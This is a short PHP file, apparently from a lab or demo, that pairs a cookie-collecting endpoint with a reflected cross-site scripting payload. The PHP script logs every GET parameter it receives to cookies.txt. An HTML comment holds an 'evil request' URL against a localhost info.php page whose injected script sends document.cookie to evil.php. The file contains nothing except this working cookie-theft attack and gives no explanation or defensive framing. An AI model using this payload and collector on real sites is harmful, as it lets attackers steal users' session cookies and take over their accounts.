<?php
 $handle = fopen('cookies.txt', 'a');
 foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "\r\n");
 }
 fclose($handle);
 exit;
?>
<!-- send evil request -->
<!-- http://localhost:3000/info.php?id=4<script>img=new Image();url="evil.php?g=";url=url.concat(document.cookie);img.src=url;</script> -->
```

